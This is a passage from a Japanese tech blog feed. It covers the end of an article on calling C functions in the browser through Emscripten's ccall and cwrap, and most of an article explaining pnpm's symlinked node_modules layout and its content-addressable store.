class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello Wasm<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    value 1 : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">id</span>=<span class="string">&quot;value1&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">    value 2 : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">id</span>=<span class="string">&quot;value2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span>&gt;</span>add<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;result&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;button&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> result = <span class="title class_">Module</span>.<span class="title function_">ccall</span>(</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;add&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;number&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">          [<span class="string">&quot;number&quot;</span>, <span class="string">&quot;number&quot;</span>],</span></span><br><span class="line"><span class="language-javascript">          [</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;value1&quot;</span>).<span class="property">value</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;value2&quot;</span>).<span class="property">value</span>,</span></span><br><span class="line"><span class="language-javascript">          ]</span></span><br><span class="line"><span class="language-javascript">        );</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;result&quot;</span>).<span class="property">textContent</span> = result;</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/images/20230517a/image.png" alt="" width="509" height="159" loading="lazy"><p>addボタンを押すたびに <code>Module.ccall()</code> によってCプログラムで定義した <code>add()</code> が呼び出され和を計算しています。</p><p>引数には呼び出すCの関数の”関数名”、”戻り値の型”、”引数の型”、”引数”を渡すことで実行することができます。</p><h3 id="cwrapを使用した方法"><a href="#cwrapを使用した方法" class="headerlink" title="cwrapを使用した方法"></a>cwrapを使用した方法</h3><p>次に、新しく以下のhtmlを作成し再度ブラウザで読み込んでみます。</p><figure class="highlight html"><figcaption><span>cwrap.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello Wasm<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">Module</span>.<span class="property">onRuntimeInitialized</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> add = <span class="title class_">Module</span>.<span class="title function_">cwrap</span>(<span class="string">&quot;add&quot;</span>,<span class="string">&#x27;number&#x27;</span>,[<span class="string">&#x27;number&#x27;</span>, <span class="string">&#x27;number&#x27;</span>])</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">1</span>,<span class="number">2</span>))</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">3</span>,<span class="number">4</span>))</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">5</span>,<span class="number">6</span>))</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/images/20230517a/image_2.png" alt="" width="849" height="182" loading="lazy"><p>コンソールに計算結果が表示されていることが確認できます。<code>cwrap</code> はCの関数の”関数名”、”戻り値の型”、”引数の型”を引数とし、Cの関数を実行するJavaScriptの関数を返します。</p><p>何度も同じ関数を使用する必要がある場合は <code>ccall</code> に比べて記述がスッキリしますね。</p><p>最初に実装した際はscriptタグを以下のように書いてエラーが発生しました。どうやらランタイムの準備が完了する前にwasmモジュールを使おうとしたことが原因のようです。</p><p><code>Module.onRuntimeInitialized</code> によって初期化の完了後に実行することで回避ができました。</p><figure class="highlight html"><figcaption><span>cwrap_error.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> add = <span class="title class_">Module</span>.<span class="title function_">cwrap</span>(<span class="string">&quot;add&quot;</span>, <span class="string">&quot;number&quot;</span>, [<span class="string">&quot;number&quot;</span>, <span class="string">&quot;number&quot;</span>]);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">1</span>, <span class="number">2</span>));</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">3</span>, <span class="number">4</span>));</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">5</span>, <span class="number">6</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uncaught RuntimeError: Aborted(Assertion failed: native <span class="keyword">function</span> `add` called before runtime initialization)</span><br></pre></td></tr></table></figure><h2 id="さいごに"><a href="#さいごに" class="headerlink" title="さいごに"></a>さいごに</h2><p>ブラウザ上でC言語を動作させる技術として以前から気になっていたWebAssemblyとEmscriptenについて、簡単に触ってみた内容を記事にさせていただきました。Emscriptenによって出力される内容がかなり充実しており、ほとんど実装することなくブラウザ上での動作を実現できました。</p><p>今回はEmscriptenを中心に理解を深めることができましたが、今後はWebAssembly自体について詳しく見ていきたいと思います。</p><p>次の記事は佐々木さんの<a href="/articles/20230518a/">ネットワーク入門としてCCNA試験を受験してみた</a>です！</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Infrastructure/">Infrastructure</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E5%85%A5%E9%96%80/">入門</category>
      
      <category domain="https://future-architect.github.io/tags/WebAssembly/">WebAssembly</category>
      
      <category domain="https://future-architect.github.io/tags/Emscripten/">Emscripten</category>
      
      
      <comments>https://future-architect.github.io/articles/20230517a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>JSパッケージ管理ツールpnpmの概要と内部構造を眺める</title>
      <link>https://future-architect.github.io/articles/20230516a/</link>
      <guid>https://future-architect.github.io/articles/20230516a/</guid>
      <pubDate>Mon, 15 May 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;img src=&quot;/images/20230516a/image.png&quot; alt=&quot;&quot; width=&quot;225&quot; height=&quot;160&quot; loading=&quot;lazy&quot;&gt;

&lt;p&gt;画像は&lt;a href=&quot;https://pnpm.io/logos&quot;&gt;pnpm</description>
          
        
      
      
      
      <content:encoded><![CDATA[<img src="/images/20230516a/image.png" alt="" width="225" height="160" loading="lazy"><p>画像は<a href="https://pnpm.io/logos">pnpm Logos</a>より引用しました。</p><hr><p>2022年に入社したTIGコアテクノロジーユニット所属の齋藤と申します。</p><p><a href="https://vercel.com/">Vercel</a>に触れてみようVercel CLIのインストール方法を調べていたところ、パッケージ管理ツールを用いたインストール方法としてnpm, Yarnと並んでpnpm<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>が書かれていました。npmとYarnは利用したことがある一方で、pnpmは馴染みがなく、触れたことがありませんでした。</p><p>pnpmではどのようにパッケージを管理しているかなどの特徴を調べました。</p><h2 id="pnpmの概要"><a href="#pnpmの概要" class="headerlink" title="pnpmの概要"></a>pnpmの概要</h2><p><a href="https://pnpm.io/">pnpm</a>はJavaScript系のパッケージ管理ツールです。pnpmは<code>performant npm</code>の略であり<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>、その名の通りパフォーマンス性を重視した設計になっています。</p><p><code>package.json</code>を利用するほか、npmリポジトリにあるほとんどのパッケージが利用可能であるなど、npmとは互換性を持っています。</p><p>pnpm公式ドキュメントによると、pnpmは以下の特徴を有しています。</p><ul><li>高速: 他のツールより最大2倍高速に動作する</li><li>高効率: <code>node_modules</code>配下にあるファイルはコンテンツのアドレス指定可能な単一のストレージ（contents-addressable storage）にあるファイルの複製、または、ハードリンクになっている</li><li>モノレポのサポート: 一つのレポジトリにパッケージを複数配置する構成をビルトインでサポートしている（workspace機能）</li><li>厳格: デフォルトではnon-flat node_modulesを採用しており、<code>node_modules</code>配下にある任意のパッケージにはアクセスできないようになっている（<code>dependecies</code>にないパッケージにアクセスできない）</li></ul><p>npmやYarnでも対応している「モノレポのサポート」以外について、どのようにして、上記特徴を実現しているのかを後ほど見ていきます。</p><h2 id="pnpmの初歩的な利用方法"><a href="#pnpmの初歩的な利用方法" class="headerlink" title="pnpmの初歩的な利用方法"></a>pnpmの初歩的な利用方法</h2><p>pnpmでインストールしたパッケージの管理方法を見る前に、ごく簡単に利用方法を見ていきます。</p><p>以降Linux環境で用いることを想定してコマンド等を記載します。</p><p>pnpmのインストール方法は<a href="https://pnpm.io/installation">pnpm Installation</a>を参照してください。</p><h3 id="パッケージの追加-x2F-削除"><a href="#パッケージの追加-x2F-削除" class="headerlink" title="パッケージの追加&#x2F;削除"></a>パッケージの追加&#x2F;削除</h3><p>コマンド自体は他のツールと大差ありません。expressを追加する場合を例とします。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">expressを追加する</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pnpm add express</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">node_modules  package.json  pnpm-lock.yaml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">package.jsonを確認する</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> package.json</span></span><br><span class="line">&#123;</span><br><span class="line">        &quot;dependencies&quot;: &#123;</span><br><span class="line">                &quot;express&quot;: &quot;^4.18.2&quot;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Expressを削除する</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pnpm remove express</span></span><br></pre></td></tr></table></figure><p><code>pnpm add</code>を実行すると<code>package.json</code>, <code>pnpm-lock.yml</code>が生成され、<code>node_modules/</code>配下にパッケージがインストールされます。<code>package.json</code>のフォーマットは<code>npm</code>と同様です。また、<code>pnpm-lock.yaml</code>はnpmの<code>package-lock.json</code>と同様にインストールしたパッケージのバージョン等の情報が記録されています。</p><p>既にある<code>package.json</code>から依存パッケージをインストールする場合は、<code>pnpm install</code>を実行すればよいです。</p><h3 id="スクリプトの実行"><a href="#スクリプトの実行" class="headerlink" title="スクリプトの実行"></a>スクリプトの実行</h3><p>こちらも<code>npm run &lt;script_name&gt;</code>と同様のコマンドで実行できます。<code>pnpm start</code>や<code>pnpm test</code>などの短縮形で<code>start</code>スクリプトや<code>test</code>スクリプトを実行できることも同様にできます。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> package.json</span></span><br><span class="line">&#123;</span><br><span class="line">        &quot;scriptss&quot;: &#123;</span><br><span class="line">                &quot;hello&quot;: &quot;echo hello&quot;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pnpm run hello</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">@ hello /path/to/preject</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">echo</span> hello</span></span><br><span class="line"></span><br><span class="line">hello</span><br></pre></td></tr></table></figure><h2 id="内部構成を見てみる"><a href="#内部構成を見てみる" class="headerlink" title="内部構成を見てみる"></a>内部構成を見てみる</h2><p>基本的な利用方法はnpmと大差ないpnpmですが、インストールした依存パッケージの管理方法は大きく異なります。pnpmがどのように管理しているかを見ていきます。</p><p>以下のpnpm, npmのバージョンで確認しています。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pnpm --version</span></span><br><span class="line">8.4.0</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">npm --version</span></span><br><span class="line">9.5.1</span><br></pre></td></tr></table></figure><p>また、今回は特にオプション等を設定していない場合の構造について説明します（設定によってはnpmと同様のディレクトリ構造にすることなども可能です）</p><h3 id="node-modules"><a href="#node-modules" class="headerlink" title="node_modules"></a>node_modules</h3><p>まずは、<code>node_modules/</code>配下を見てみます。依存パッケージに<code>express@4.18.2</code>のみを指定した<code>package.json</code>で<code>pnpm install</code>を実行します。実行後の<code>node_modules/</code>配下は以下の通りです。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pnpm</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> node_modules/</span></span><br><span class="line">express</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree -a node_modules/</span></span><br><span class="line">node_modules/</span><br><span class="line">├── express -&gt; .pnpm/express@4.18.2/node_modules/express</span><br><span class="line">├── .modules.yaml</span><br><span class="line">└── .pnpm</span><br><span class="line">    ├── accepts@1.3.8</span><br><span class="line">    │   └── node_modules</span><br><span class="line">    │       ├── accepts</span><br><span class="line">    │       │   ├── HISTORY.md</span><br><span class="line">    │       │   ├── index.js</span><br><span class="line">    │       │   ├── LICENSE</span><br><span class="line">    │       │   ├── package.json</span><br><span class="line">    │       │   └── README.md</span><br><span class="line">    │       ├── mime-types -&gt; ../../mime-types@2.1.35/node_modules/mime-types</span><br><span class="line">    │       └── negotiator -&gt; ../../negotiator@0.6.3/node_modules/negotiator</span><br><span class="line">    ...</span><br><span class="line">    ├── express@4.18.2</span><br><span class="line">    │   └── node_modules</span><br><span class="line">    │       ├── accepts -&gt; ../../accepts@1.3.8/node_modules/accepts</span><br><span class="line">    │       ├── array-flatten -&gt; ../../array-flatten@1.1.1/node_modules/array-flatten</span><br><span class="line">    │       ...</span><br><span class="line">    │       ├── express</span><br><span class="line">    │       │   ├── History.md</span><br><span class="line">    │       │   ├── index.js</span><br><span class="line">    ...</span><br><span class="line">    ├── node_modules</span><br><span class="line">    │   ├── accepts -&gt; ../accepts@1.3.8/node_modules/accepts</span><br><span class="line">    │   ├── array-flatten -&gt; ../array-flatten@1.1.1/node_modules/array-flatten</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>同様に、npmで<code>npm install</code>した場合の<code>node_modules</code>配下を確認します。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">npm</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> node_modules/</span></span><br><span class="line">accepts array-flatten ... express ...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree -a node_modules/</span></span><br><span class="line">node_modules/</span><br><span class="line">├── accepts</span><br><span class="line">│   ├── HISTORY.md</span><br><span class="line">│   ├── index.js</span><br><span class="line">│   ├── LICENSE</span><br><span class="line">│   ├── package.json</span><br><span class="line">│   └── README.md</span><br><span class="line">...</span><br><span class="line">├── express</span><br><span class="line">│   ├── History.md</span><br><span class="line">│   ├── index.js</span><br><span class="line">│   ├── lib</span><br><span class="line">│   │   ├── application.js</span><br><span class="line">│   │   ├── express.js</span><br><span class="line">│   │   ...</span><br><span class="line">│   │   └── view.js</span><br><span class="line">│   ├── LICENSE</span><br><span class="line">│   ├── package.json</span><br><span class="line">│   └── Readme.md</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pnpmの場合、<code>/node_modules/</code>直下には隠しファイルを除くと<code>dependencies</code>に記述した<code>express</code>のみ存在し、<code>express</code>はシンボリックリンクになっています。リンク先と同階層には<code>express</code>が依存するパッケージへのシンボリックリンクが張られています。リンクの関係を下の図で示しました。</p><p>node.jsでは実際に存在する場所（リンク先）から依存パッケージを解決するため、このようにシンボリックリンクを用いても依存パッケージを利用できます。</p><img src="/images/20230516a/image_2.png" alt="image.png" width="1200" height="1218" loading="lazy"><p>一方で、npm（V3以降）では基本的に<code>/node_modules/</code>直下にdependenciesの書かれたパッケージ以外にも、それらが再帰的に依存する全パッケージが配置されています。</p><p>npmでは、V2以前はある依存パッケージが依存するパッケージは依存元のパッケージ内にある<code>node_modules</code>配下に置かれる階層構造になっていましたが、V3以降はフラットな構造になっています。(ただし、依存パッケージ<code>foo@1.0</code>, <code>bar@1.0</code>がそれぞれ<code>baz@1.x</code>, <code>baz@1.y</code>に依存している場合、<code>/node_modules/foo/node_modules/baz</code>に<code>baz@1.x</code>パッケージが置かれる可能性があるなど、階層が生じる場合もあります<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>)</p><p>しかし、フラットな構造にしたことで<code>package.json</code>の<code>dependencies</code>などで指定していないパッケージをアプリで利用することができるようになりました。例えば、<code>express</code>のみを<code>dependencies</code>に指定した状態で、以下のスクリプトをnodeで実行しようとします。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> cookie = <span class="built_in">require</span>(<span class="string">&#x27;cookie&#x27;</span>)</span><br></pre></td></tr></table></figure><p>npmでパッケージをインストールして、実行した場合エラーになりません。<code>cookie</code>は<code>express</code>に依存されているため、<code>node_modules</code>直下にあり、nodeは解決できるからです。</p><p><code>dependencies</code>で指定していないパッケージを利用することは問題が起きる可能性があります。例えば、<code>express</code>のメジャーバージョンを固定していたとします。<code>cookie</code>でメジャーアップデートが行われ、<code>express</code>が対応した場合、<code>express</code>に破壊的な変更がなければマイナーアップデートで更新されます。しかし、この状態で<code>npm update</code>を実行すると<code>cookie</code>がバージョンアップされるため、意図しない不具合が生じる可能性があります。</p><p>pnpmでは<code>/node_modules/</code>直下には<code>dependencies</code>などで指定したパッケージしかないため、このような問題はおきません。上記スクリプトを実行するとエラーになります。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">node index.js</span></span><br><span class="line">node:internal/modules/cjs/loader:1078</span><br><span class="line">  throw err;</span><br><span class="line">  ^</span><br><span class="line"></span><br><span class="line">Error: Cannot find module &#x27;cookie&#x27;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="contents-addressable-storage"><a href="#contents-addressable-storage" class="headerlink" title="contents-addressable storage"></a>contents-addressable storage</h3><p>pnpmでは、各プロジェクトの<code>node_modules</code>にパッケージを追加したとき、必ずディスク上にファイルの中身が配置されるとは限りません。pnpmを用いてダウンロードしたファイルなどはグローバルなストレージに一元管理することで、ディスク使用容量の削減や、高速化を図っています。</p><p>レポジトリからダウンロードしてきたファイルはグローバルなストレージに保存され、各プロジェクトのパッケージからハードリンクが張られます。</p><p>ハードリンクはファイルの属性情報を保持しているinodeに対して、リンクが張られます。シンボリックリンクとは異なり、ファイルに対するリンクではないため、最初に作成したファイルが削除されてもリンクおよびファイルの中身は維持され、あるinodeを参照するファイルがなくなったときファイルが削除されます。</p><p>※上では「グローバルなストレージに保存され…」と書きましたが、システム的にはこれもハードリンクの一つになります。</p><p>pnpmでは<code>$PNPM_HOME/store</code>がグローバルなストレージとして用いられます。Linux環境のデフォルトでは<code>$HOME/.local/share/pnpm/store</code>です。中身を見てみます。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree store/</span></span><br><span class="line">store/</span><br><span class="line">└── v3</span><br><span class="line">    └── files</span><br><span class="line">        ├── 00</span><br><span class="line">        │   ├── ae061b93bd3f7143a55922083f16ae281852332e5d1cee867417fc1b1189400def1e6700fb03ef304d0899e31c1e23f1d38cfc6c6efa14a9466958650359a7</span><br><span class="line">        │   └── dbd6ec9969ea9d859a9fd30339a5dd4fc70f2c18d1b49a9a298389a4473a8e7f5a6fa8d2a820053643c143d7202dfdba59236e19ac28b5c19225d2df52f386</span><br><span class="line">        ├── 02</span><br><span class="line">        │   └── 07cf364e3eac974cae61ec68fe3975fd1f1eb6150f51293ce67f62dbb0f27a3d9c193101ef282dcd099fc653ca73cd3c875c18e5e266964038e3334697b5b4</span><br><span class="line">        ...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> store/V3/file/00/ae061b... | <span class="built_in">head</span> 5</span></span><br><span class="line">1.2.0 / 2022-03-22</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">  * Remove set content headers that break response</span><br><span class="line">  * deps: on-finished@2.4.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sha512sum</span> store/V3/file/00/ae061b...</span></span><br><span class="line">00ae061b...</span><br></pre></td></tr></table></figure><p>このように、ファイルの中身のsha512とファイルの中身のキーバリューストアになっていることがわかります。ファイルのsha512が一致するファイルがstoreに存在すればそれをハードリンクし、なければstoreに作成してからハードリンクするという仕組みになっています。</p><p>また、ファイルの中身以外にもパッケージのあるディレクトリに含まれるファイル情報を管理するindexファイルも存在し、Gitのblobとtreeオブジェクトの管理方法に似ていると思いました。</p><p>例えば、あるパッケージの複数のバージョンが依存パッケージとして必要なとき。2つのバージョン間では少数のファイルのみが変更され、多数のファイルには変更がないことも多いです。pnpmでは差分があるファイルのみ、新たにストレージに保存されるため、効率的に保存できます。</p><p>なお、ハードリンクでは先述の通りinodeの被参照数が0になったときファイルが削除されますが、storeにあるファイルが参照しているため、どのプロジェクトでも使われなくなったファイルもstoreに残り続けます。これらのファイルは<code>pnpm store prune</code>コマンドを実行することで、削除できます。</p><h2 id="pnpmを利用するか"><a href="#pnpmを利用するか" class="headerlink" title="pnpmを利用するか"></a>pnpmを利用するか</h2><p>ここまでpnpmの概要や、内部ではどのように管理することで高効率になっているかなどを見てきましたが、pnpmを趣味や、仕事の開発で使ってみたいか考えます。</p><p>まず、学習や趣味の開発などの個人利用ではpnpmの恩恵を受けやすく、利用しやすいと思います。以下の理由で恩恵を受けやすいと考えます。</p><ul><li>学習や、趣味の開発では様々なリポジトリからクローンするなどして、多数のnpmプロジェクトがローカルに保存されることになりやすいため、ディスク使用容量削減効果は大きい</li><li>色々なパッケージを試す機会が多く、パッケージをインストールする頻度が高くなるため、インストール高速化の恩恵を受けやすい</li></ul><p>一方、業務利用の場合でもpnpmは利用できそうですが、いくつか懸念点があります。</p><ul><li>pnpmのネットでの情報量が少ない<ul><li>例えば、<code>&lt;ツール名&gt; 